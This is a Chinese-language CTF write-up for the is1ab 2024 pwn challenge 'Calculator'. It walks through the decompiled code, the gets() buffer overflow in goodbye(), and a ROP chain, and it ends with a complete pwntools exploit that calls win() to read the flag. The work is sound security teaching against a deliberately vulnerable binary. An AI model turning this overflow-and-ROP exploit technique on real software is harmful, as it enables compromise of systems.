---
title: '[PWN] Easy - is1ab CTF 2024'
published: 2024-09-28
description: '我ㄉ攻防組報告筆記'
image: './is1ab_logo.png'
tags: [CTF, 學習筆記]
category: "Pwn-Learning"
draft: false 
---

:::info
【is1ab 新生盃CTF 2024】
- [Calculator](#Calculator)
    - [題目敘述](#題目敘述)
    - [檔案基本資訊](#檔案基本資訊)
    - [你逆!](#你逆!)
    - [Buffer_Overflow_戳一下](#Buffer_Overflow_戳一下)
    - [Basic_ROP](#Basic_ROP)
    - [x86_傳遞參數小補充](#x86_傳遞參數小補充)
    - [總結](#總結)
- [參考資料](#參考資料)
:::

## 題目敘述
- 如果想邊解題邊聽 writeup 分享，可以先至雲端硬碟區，下載題目檔案。
[G00gle Dr1ve 在此 (o🪄'▽')o🪄](https://drive.google.com/drive/folders/1VpH2gFxcBEsO6qvdc2HWAQTOLwWWeUHR?usp=sharing)
![image](https://hackmd.io/_uploads/rJYL_y_RA.png)

## 檔案基本資訊
```
$ file
```
![image](https://hackmd.io/_uploads/B1w80nsC0.png)

- ELF 執行檔案
- x86-64 架構
- dynamically linked

```
$ checksec
```
![image](https://hackmd.io/_uploads/S1nlxR_CC.png)
- 發現保護機制只有開 `NX` 和 `Partial RELRO`。
    - `NX`(No-eXecute): 一句話快速解釋，就是防止寫入的 shellcode 可以執行。
    - `Partial RELRO` - 正常預設已經有開。

## 你逆!
### 先使用 ghidra
- 逐一點進感興趣的 Functions 。
![image](https://hackmd.io/_uploads/r115ZyK0C.png)
---

- 像是從 `main` 開始。
    ``` c=
    undefined8 main(void)
    {
      int iVar1;

      setvbuf(stdin,(char *)0x0,2,0);
      setvbuf(stdout,(char *)0x0,2,0);
      setvbuf(stderr,(char *)0x0,2,0);
      puts("             _               _         _                ");
      puts(" ____   _   | |  ___  _   _ | |  __ _ | |_   ___   _ __ ");
      puts("/  __ / _` || | / __|| | | || | / _` || __| / _ \\ | \'__|");
      puts("| (__| (_| || || (__ | |_| || || (_| || |_ | (_) || |   ");
      puts(" \\___|\\__,_||_| \\___| \\__,_||_| \\__,_| \\__| \\___/ |_|   ");
      puts("                                                          ");
      do {
        calculator();
        iVar1 = goodbye();
      } while (iVar1 == 0);
      return 0;
    }
    ```
---

- 那就先去看一下 `calculator()` 在做什麼事情吧!
    ``` c=
    void calculator(void)
    {
      int iVar1;
      char local_121;
      uint local_120;
      uint local_11c;
      char local_118 [268];
      uint local_c;

      puts("This is a calculator, you know what to do ! ");
      puts("If you want to leave, please press \'q\' ");
    LAB_004012f6:
      while( true ) {
        while( true ) {
          printf("\nInput : ");
          fgets(local_118,0x100,stdin);
          if (local_118[0] == 'q') {
            puts("Exiting calculator...");
            return;
          }
          iVar1 = __isoc99_sscanf(local_118,"%d %c %d",&local_11c,&local_121,&local_120);
          if (iVar1 == 3) break;
          puts("Invalid input format. Please use the format: 1 + 1");
        }
        if (local_121 != '/') break;
        if (local_120 == 0) {
          puts("Error: Division by zero!");
        }
        else {
          local_c = (int)local_11c / (int)local_120;
          printf("Output : %d / %d = %d\n",(ulong)local_11c,(ulong)local_120,(ulong)local_c);
        }
      }
      if (local_121 < '0') {
        if (local_121 == '-') {
          local_c = local_11c - local_120;
          printf("Output : %d - %d = %d\n",(ulong)local_11c,(ulong)local_120,(ulong)local_c);
          goto LAB_004012f6;
        }
        if (local_121 < '.') {
          if (local_121 == '*') {
            local_c = local_120 * local_11c;
            printf("Output : %d * %d = %d\n",(ulong)local_11c,(ulong)local_120,(ulong)local_c);
          }
          else {
            if (local_121 != '+') goto LAB_004014bb;
            local_c = local_120 + local_11c;
            printf("Output : %d + %d = %d\n",(ulong)local_11c,(ulong)local_120,(ulong)local_c);
          }
          goto LAB_004012f6;
        }
      }
    LAB_004014bb:
      puts("Invalid operation!");
      goto LAB_004012f6;
    }
    ```
---

- 接著怎麼有個 `win()` 看起來就很像有 flag。
    ``` c=
    void win(int param_1)
    {
      undefined8 local_58;
      undefined8 local_50;
      undefined8 local_48;
      undefined8 local_40;
      undefined8 local_38;
      undefined8 local_30;
      undefined8 local_28;
      undefined8 local_20;
      FILE *local_10;

      if (param_1 == -0x3f01454d) {
        local_58 = 0;
        local_50 = 0;
        local_48 = 0;
        local_40 = 0;
        local_38 = 0;
        local_30 = 0;
        local_28 = 0;
        local_20 = 0;
        local_10 = fopen("/home/ctf/flag.txt","r");
        if (local_10 == (FILE *)0x0) {
          puts("Opps, you forget creating \'flag.txt\' to help you debug");
                        /* WARNING: Subroutine does not return */
          exit(0);
        }
        fgets((char *)&local_58,0x40,local_10);
        puts("Dame! You are a calculator expert!");
        puts((char *)&local_58);
      }
      else {
        puts("So close !!");
      }
      return;
    }
    ```
- 有是有，但是有個 **if 條件式要先符合**。
- 很醜的 `param_1 == -0x3f01454d` 是什麼意思
    - 從 assembly code 可以知道:
![image](https://hackmd.io/_uploads/SkI5f7FA0.png)

---

- Ummm，好像沒什麼不正常的，那再去翻一下 `goodbye()`。
    ``` c=
    undefined8 goodbye(void)

    {
      undefined8 uVar1;
      char local_c [4];

      puts("Are you sure you want to leave? [Y/n]");
      gets(local_c);
      if ((local_c[0] == 'y') || (local_c[0] == 'Y')) {
        puts("bye!bye!");
        uVar1 = 1;
      }
      else {
        uVar1 = 0;
      }
      return uVar1;
    }
    ```
:::spoiler 🔎 阿哈，是不是出現什麼熟悉的 **unsafe function**
 沒錯，就是在第八行 `gets(local_c)` 不會檢查使用者的輸入長度。
:::
---

## Buffer_Overflow_戳一下
- 複習 stack frame
    - ![image](https://hackmd.io/_uploads/HJ75R2jA0.png)

- 從 `goodbye()` 可以知道 **local_c 的 buffer 大小**為 4-bytes 。
``` c
char local_c [4];
```
- 加上 **x64 架構下的 rbp** 是 8-bytes 。
``` kali
┌──(kali㉿kali)-[~/Desktop]
└─$ file calculator 
calculator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib6 BuildID[sha1]=bdd857945d4521a6a0ea022988f98642f0421868, for GNU/Linux 3.2.0, not stripped
```

:::success
💡 Payload_1 - Buffer Padding
``` c
buffer_padding = local_c_buffer + rpb_buffer
               = 4 + 8 = 12 #bytes
```
:::
---

### gdb + gef
- 透過 gdb ，確認一下 local_c 的 buffer 。
```
$ pattern create 0x10
$ pattern search 0x6161616261616161

gef➤  patter search 0x6161616261616161
[+] Searching for '6161616162616161'/'6161616261616161' with period=8
[+] Found at offset 4 (little-endian search) likely
```
- 再嘗試寫 payload ，試試看是否可以順利跳到 `win()`
:::success
💡 payload_2 - Overwrite return address
``` python
payload_2 = b'a'*12 + p64(win_addr)
```
:::

- 答案是 so close !!，那我們離 flag 還有多遠呢?
``` kali
╰─ python3 test.py
[+] Starting program './calculator': Done
[*] Switching to interactive mode
So close !!
[*] Got EOF while reading in interactive
```

## Basic_ROP
### 先了解條件，再去找合適的 gadget
- **條件:** `win(para_1)` 的 `para_1 = 0xc0febab3`
- 但是在透過工具找 gadget 以前，有一個 function 叫做 `gadget()`，應該蠻故意的吧。
- 所以，看一下內容:
    ``` c
    void gadget(void)

    {
      return;
    }
    ```
- Weeeeee，有用的 gadget 來了。
- 雖然好像還是看 assembly code 比較好理解。
![螢幕擷取畫面 2024-10-01 150646](https://hackmd.io/_uploads/SkgKZ7KRC.png)

:::success
💡 payload_3 - Gadget & Parameter
``` python
payload_3 = b'a'*12 + p64(pop_rdi_ret) + p64(parameter)
```
:::
---

### 獲得了3個重要拼圖，然後呢，怎麼放
- 很怒，因為 payload 一直沒寫好，所以暴力亂塞看看?
    - 並沒有，還是有認真思考過，**請看下方思考筆記** ヾ(´ε`ヾ)
    ![Notes_241003_202410](https://hackmd.io/_uploads/S1j4TWnAC.jpg)







:::success
💡 final_payload
``` python
from pwn import *

#r = remote('127.0.0.1', 33537)
p = process('./calculator')

context.arch = 'amd64'

pop_rdi_ret = 0x40119a
para1 = 0xc0febab3
win_adr = 0x40119f

input = b'q'
payload = b'a'*12
payload += p64(pop_rdi_ret)
payload += p64(para1)
payload += p64(win_adr)

p.recvuntil(b': ')
p.sendline(input)

p.recvuntil(b'[Y/n]\n')
p.sendline(payload)

p.interactive()
```
:::

## x86_傳遞參數小補充
- stack frame範例
    ![image](https://hackmd.io/_uploads/ryw_f3i0A.png)
- 假設有一個 source code ，在 `main()` 裡需要 call `foo()`。 
    ``` c
    #include <stdio.h>
    int foo ( int arg0, int arg1 ) {  
        int sum;
        int a = 2, b = 3, c = 4, d = 5;
        sum = arg0 + arg1 + a * b / c * d;
        return sum;
    }
    int main () {  
        int a, b, c;
        a = 1;
        b = 2;
        c = foo ( a, b ) ;
        printf ( "c = %d\n" , c ) ;
        return 0;
    }
    ```
    1. 正執行在 `main()` 上。
        ![image](https://hackmd.io/_uploads/BJsLq3oCR.png)

    2. 在 call `foo()` 之前，先將所需的參數 push in stack 。
        ![image](https://hackmd.io/_uploads/r1hY9ns0R.png)
    3. 在執行 `foo()` 的起手式，先儲存 `old ebp`，再將 `ebp` 指向 `esp` 。
        ![image](https://hackmd.io/_uploads/SJnh5hjR0.png)
    4. 使用 `esp` 減出需要的空間存放 local variables 。
        ![image](https://hackmd.io/_uploads/r1uYhnoRA.png)
    5. 即將結束 `foo()` 。
        ![image](https://hackmd.io/_uploads/Hk5p22o0A.png)
    6. 返回到 `main() `。
        ![image](https://hackmd.io/_uploads/SkTJ63j0R.png)

## 總結
### 技術點
1. 可以**造成 buffer overflow** 的 unsafe function 。
2. 知道關於 calling convention 的部分，**「傳遞參數」時的方法**。
3. 找到**合適的 gadget，需先清楚要達成的目的**。
4. **對我來說，非常需要藉由畫圖來協助想像**，才能夠更好地理解程式流程。

### 工具
1. `gdb`: 可以跑起來透過 breakpoint 查看一行行的程式執行、 register 儲存數值和測試 buffer overflow...。
2. `pwntools`: 寫 payload 的好朋友。
3. `ROPgadget`: 一般來說，可以方便找到或篩選需要的 gadgets ，不過這題我沒有用到。

## 參考資料

[[資訊安全] 從毫無基礎開始 Pwn – 概念](https://mks.tw/2968/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-%E5%BE%9E%E6%AF%AB%E7%84%A1%E5%9F%BA%E7%A4%8E%E9%96%8B%E5%A7%8B-pwn-%E6%A6%82%E5%BF%B5)
(關於走上 PWN 這條路，快速了解你需要知道的)

[PWN週 - ROP (Return Oriented Programmimg)](https://hackmd.io/@MuZi/B1uWgNppR)
(上週報告內容的詳細筆記)

[函數呼叫與堆疊-X86為例](https://blog.shi1011.cn/learn/2510)
(x86範例圖的來源)